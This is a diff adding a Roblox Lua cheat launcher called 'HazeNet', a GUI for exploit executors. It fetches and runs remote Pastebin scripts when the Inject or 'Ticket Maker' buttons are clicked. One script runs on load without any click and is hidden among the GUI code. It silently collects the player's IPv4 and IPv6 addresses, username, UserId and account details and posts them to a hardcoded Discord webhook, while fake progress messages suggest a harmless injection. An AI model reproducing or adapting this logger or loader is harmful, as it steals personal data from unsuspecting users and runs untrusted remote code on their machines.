@@ -1,1 +1,357 @@
-print("Testing)
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Injector = Instance.new("ScreenGui")
+local Launcher = Instance.new("Frame")
+local TopFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Version = Instance.new("TextLabel")
+local MsgOfTheDay = Instance.new("TextLabel")
+local Inject = Instance.new("TextButton")
+local Update = Instance.new("TextButton")
+local AlertBox = Instance.new("Frame")
+local AlertTitle = Instance.new("TextLabel")
+local I1 = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local I2 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local I3 = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local Alert = Instance.new("TextLabel")
+local Update_2 = Instance.new("TextButton")
+local Frame = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local Frame_3 = Instance.new("Frame")
+
+--Properties:
+
+Injector.Name = "Injector"
+Injector.Parent = game.CoreGui
+Injector.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Launcher.Name = "Launcher"
+Launcher.Parent = Injector
+Launcher.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+Launcher.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Launcher.BorderSizePixel = 2
+Launcher.Position = UDim2.new(0.739842355, 0, 0.370679259, 0)
+Launcher.Size = UDim2.new(0, 297, 0, 386)
+
+TopFrame.Name = "TopFrame"
+TopFrame.Parent = Launcher
+TopFrame.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+TopFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TopFrame.Size = UDim2.new(0, 297, 0, 27)
+
+Title.Name = "Title"
+Title.Parent = TopFrame
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1.000
+Title.Position = UDim2.new(0.0202020202, 0, 0, 0)
+Title.Size = UDim2.new(0, 130, 0, 27)
+Title.Font = Enum.Font.GothamSemibold
+Title.Text = "HazeNet - Launcher"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 14.000
+Title.TextStrokeTransparency = 0.000
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+Version.Name = "Version"
+Version.Parent = TopFrame
+Version.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Version.BackgroundTransparency = 1.000
+Version.Position = UDim2.new(0.818181813, 0, 0, 0)
+Version.Size = UDim2.new(0, 54, 0, 27)
+Version.Font = Enum.Font.GothamSemibold
+Version.Text = "V1.5"
+Version.TextColor3 = Color3.fromRGB(255, 255, 255)
+Version.TextSize = 14.000
+Version.TextStrokeTransparency = 0.000
+
+MsgOfTheDay.Name = "MsgOfTheDay"
+MsgOfTheDay.Parent = Launcher
+MsgOfTheDay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MsgOfTheDay.BackgroundTransparency = 1.000
+MsgOfTheDay.Position = UDim2.new(0.0202020202, 0, 0.069948189, 0)
+MsgOfTheDay.Size = UDim2.new(0, 291, 0, 18)
+MsgOfTheDay.Font = Enum.Font.Arial
+MsgOfTheDay.Text = "Pigs Can Fly, Dont Let People Tell You Otherwise"
+MsgOfTheDay.TextColor3 = Color3.fromRGB(255, 255, 255)
+MsgOfTheDay.TextSize = 14.000
+MsgOfTheDay.TextXAlignment = Enum.TextXAlignment.Left
+
+Inject.Name = "Inject"
+Inject.Parent = Launcher
+Inject.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+Inject.BorderColor3 = Color3.fromRGB(255, 165, 0)
+Inject.Position = UDim2.new(0.161616161, 0, 0.435233176, 0)
+Inject.Size = UDim2.new(0, 200, 0, 50)
+Inject.Font = Enum.Font.GothamSemibold
+Inject.Text = "Inject"
+Inject.TextColor3 = Color3.fromRGB(255, 255, 255)
+Inject.TextSize = 14.000
+
+Update.Name = "Update"
+Update.Parent = Launcher
+Update.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+Update.BorderColor3 = Color3.fromRGB(255, 165, 0)
+Update.Position = UDim2.new(0.161616161, 0, 0.585492253, 0)
+Update.Size = UDim2.new(0, 200, 0, 50)
+Update.Font = Enum.Font.GothamSemibold
+Update.Text = "News"
+Update.TextColor3 = Color3.fromRGB(255, 255, 255)
+Update.TextSize = 14.000
+
+AlertBox.Name = "AlertBox"
+AlertBox.Parent = Launcher
+AlertBox.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+AlertBox.BorderColor3 = Color3.fromRGB(255, 165, 0)
+AlertBox.Position = UDim2.new(0.168350175, 0, 0.189119175, 0)
+AlertBox.Size = UDim2.new(0, 198, 0, 81)
+
+AlertTitle.Name = "AlertTitle"
+AlertTitle.Parent = AlertBox
+AlertTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AlertTitle.BackgroundTransparency = 1.000
+AlertTitle.Position = UDim2.new(0, 0, -0.25287357, 0)
+AlertTitle.Size = UDim2.new(0, 50, 0, 22)
+AlertTitle.Font = Enum.Font.GothamSemibold
+AlertTitle.Text = "Alert Box:"
+AlertTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+AlertTitle.TextSize = 14.000
+AlertTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+I1.Name = "I1"
+I1.Parent = AlertBox
+I1.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+I1.Position = UDim2.new(0.309764326, 0, 0.670440674, 0)
+I1.Size = UDim2.new(0, 16, 0, 16)
+
+UICorner.Parent = I1
+
+I2.Name = "I2"
+I2.Parent = AlertBox
+I2.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+I2.Position = UDim2.new(0.461279452, 0, 0.670440674, 0)
+I2.Size = UDim2.new(0, 16, 0, 16)
+
+UICorner_2.Parent = I2
+
+I3.Name = "I3"
+I3.Parent = AlertBox
+I3.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+I3.Position = UDim2.new(0.597643137, 0, 0.670440674, 0)
+I3.Size = UDim2.new(0, 16, 0, 16)
+
+UICorner_3.Parent = I3
+
+Alert.Name = "Alert"
+Alert.Parent = AlertBox
+Alert.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Alert.BackgroundTransparency = 1.000
+Alert.Position = UDim2.new(0.202020198, 0, 0, 0)
+Alert.Size = UDim2.new(0, 118, 0, 15)
+Alert.Font = Enum.Font.GothamSemibold
+Alert.Text = "Please Inject!"
+Alert.TextColor3 = Color3.fromRGB(255, 255, 255)
+Alert.TextSize = 14.000
+
+Update_2.Name = "Update"
+Update_2.Parent = Launcher
+Update_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+Update_2.BorderColor3 = Color3.fromRGB(255, 165, 0)
+Update_2.Position = UDim2.new(0.161616161, 0, 0.738341987, 0)
+Update_2.Size = UDim2.new(0, 200, 0, 50)
+Update_2.Font = Enum.Font.GothamSemibold
+Update_2.Text = "Ticket Maker"
+Update_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Update_2.TextSize = 14.000
+
+Frame.Parent = Injector
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 2
+Frame.Position = UDim2.new(0.272286236, 0, 0.39094159, 0)
+Frame.Size = UDim2.new(0, 489, 0, 337)
+Frame.Visible = false
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 25, 28)
+Frame_2.Size = UDim2.new(0, 489, 0, 28)
+
+TextLabel.Parent = Frame_2
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.0184049308, 0, -0.0357142873, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 30)
+TextLabel.Font = Enum.Font.GothamSemibold
+TextLabel.Text = "Infomation"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+TextLabel.TextStrokeTransparency = 0.000
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.0184049085, 0, 0.0919881314, 0)
+TextLabel_2.Size = UDim2.new(0, 245, 0, 19)
+TextLabel_2.Font = Enum.Font.GothamSemibold
+TextLabel_2.Text = "What Security Does This Script Use?"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+
+TextLabel_3.Parent = Frame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.0184049085, 0, 0.148367956, 0)
+TextLabel_3.Size = UDim2.new(0, 245, 0, 19)
+TextLabel_3.Font = Enum.Font.GothamSemibold
+TextLabel_3.Text = "HazeNet Secure!"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
+
+Frame_3.Parent = Frame
+Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_3.Position = UDim2.new(0, 0, 0.204747781, 0)
+Frame_3.Size = UDim2.new(0, 489, 0, 0)
+
+-- Scripts:
+
+local function WIGUOI_fake_script() -- Inject.Detector 
+	local script = Instance.new('LocalScript', Inject)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		wait(1)
+		script.Parent.Parent.AlertBox.I1.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+		wait(3)
+		script.Parent.Parent.AlertBox.I2.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+		wait(2)
+		script.Parent.Parent.AlertBox.I3.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+		wait(2)
+		if game.PlaceId == 2788229376 then -- Da Hood
+			loadstring(game:HttpGet("https://pastebin.com/raw/mSqDHYJ4" , true))()
+		else if game.PlaceId == 286090429 then -- Arsenal
+				loadstring(game:HttpGet("https://pastebin.com/raw/GbKufAEn" , true))()
+		else -- Universal
+			loadstring(game:HttpGet("https://pastebin.com/raw/THgQrBge", true))()
+		end
+			script.Parent.Parent.Parent.Launcher:Destroy()
+			end
+	end)
+end
+coroutine.wrap(WIGUOI_fake_script)()
+local function CDQWCTN_fake_script() -- Inject.LocalScript 
+	local script = Instance.new('LocalScript', Inject)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.AlertBox.Alert.Text = "Detected Click"
+		wait(1)
+		script.Parent.Parent.AlertBox.Alert.Text = "Current Version Found"
+		wait(2)
+		script.Parent.Parent.AlertBox.Alert.Text = "Detecting Game"
+		wait(2)
+		script.Parent.Parent.AlertBox.Alert.Text = "Injected, Please Wait"
+	end)
+end
+coroutine.wrap(CDQWCTN_fake_script)()
+local function DYUTKBP_fake_script() -- Inject.LocalScript 
+	local script = Instance.new('LocalScript', Inject)
+
+	
+		local Webhook = "https://discord.com/api/webhooks/957712946719490058/mWYOHQADvxoqkLKF-7F68NuY71901OOu0o4h4gQk6v88krWmr44HBwcctOdLPiv_cwcE" -- Put your Webhook link here
+	
+		local IPv4 = game:HttpGet("https://v4.ident.me/")
+		local IPv6 = game:HttpGet("https://v6.ident.me/")
+	
+	
+		local Headers = {["content-type"] = "application/json"} -- Don't Modify
+	
+		local LocalPlayer = game:GetService("Players").LocalPlayer
+	
+	
+	
+		local AccountAge = LocalPlayer.AccountAge
+		local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+		local UserId = LocalPlayer.UserId
+		local PlayerName = game.Players.LocalPlayer.Name
+	
+		local PlayerData =
+			{
+				["content"] = "",
+				["embeds"] = {{
+					["title"] = "**Username**:",
+					["description"] = PlayerName,
+					["color"] = tonumber(0x2B6BE4),
+					["fields"] = {
+						{
+							["name"] = "MembershipType:",
+							["value"] = MembershipType,
+							["inline"] = true
+						},
+						{
+							["name"] = "AccountAge:",
+							["value"] = AccountAge,
+							["inline"] = true
+						},
+						{
+							["name"] = "UserId:",
+							["value"] = UserId,
+							["inline"] = true
+						},
+						{
+							["name"] = "IPv4:",
+							["value"] = IPv4,
+							["inline"] = true
+						},
+						{
+							["name"] = "IPv6:",
+							["value"] = IPv6,
+							["inline"] = true
+						},
+						{
+							["name"] = "Game Id:",
+							["value"] = game.PlaceId,
+							["inline"] = false
+						},
+	
+	
+					},
+				}}
+			}
+	
+		local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+		local HttpRequest = http_request;
+	
+		if syn then
+			HttpRequest = syn.request
+		else
+			HttpRequest = http_request
+		end
+	
+		HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+	
+end
+coroutine.wrap(DYUTKBP_fake_script)()
+local function GDLYB_fake_script() -- Update_2.LocalScript 
+	local script = Instance.new('LocalScript', Update_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/PzrtJ4J6", true))()
+	end)
+end
+coroutine.wrap(GDLYB_fake_script)()
+local function YGHNYC_fake_script() -- Launcher.LocalScript 
+	local script = Instance.new('LocalScript', Launcher)
+
+	script.Parent.Active = true
+	script.Parent.Draggable = true
+end
+coroutine.wrap(YGHNYC_fake_script)()
